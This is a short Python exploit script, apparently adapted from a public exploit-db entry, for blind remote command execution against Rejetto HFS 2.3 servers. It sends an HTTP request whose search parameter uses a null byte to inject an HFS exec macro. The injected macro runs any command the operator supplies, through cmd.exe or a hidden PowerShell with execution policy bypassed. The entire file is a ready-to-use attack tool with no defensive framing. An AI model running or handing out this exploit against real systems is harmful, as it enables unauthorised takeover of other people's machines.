#!/usr/bin/python3

# author: dugisan3rd
# reference: https://www.exploit-db.com/exploits/39161

import requests
import argparse
import sys

parser = argparse.ArgumentParser(description="Rejetto HFS 2.3 Blind RCE")
parser.add_argument("-r", "--rhost", help="Target IP")
parser.add_argument("-p", "--rport", default=80, type=int, help="Target port")
parser.add_argument("-x", "--command", help="Command to execute")
parser.add_argument("-s", "--shell", help="[cmd|ps]")
args = parser.parse_args()
rhost = args.rhost
rport = args.rport
command = args.command
shell = args.shell
if len(sys.argv) < 2:
    print("[+] Arguments required! Please use -h for more details")
else:
    if rhost and rport and command and shell is not None:
        if shell == "cmd":
            term = f"C:\Windows\System32\cmd.exe /c {command}"
            url = f"http://{rhost}:{rport}/?search=%00{{.+exec|{term}.}}"
            r = requests.get(url)
            if r.status_code == 200:
                print("[+] Payload sent")
        elif shell == "ps":
            term = f"C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command {command}"
            url = f"http://{rhost}:{rport}/?search=%00{{.+exec|{term}.}}"
            r = requests.get(url)
            if r.status_code == 200:
                print("[+] Payload sent")
        else:
            print("[+] Use cmd for command prompt or ps for powershell")
    else:
        print('[+] Missing arguments!')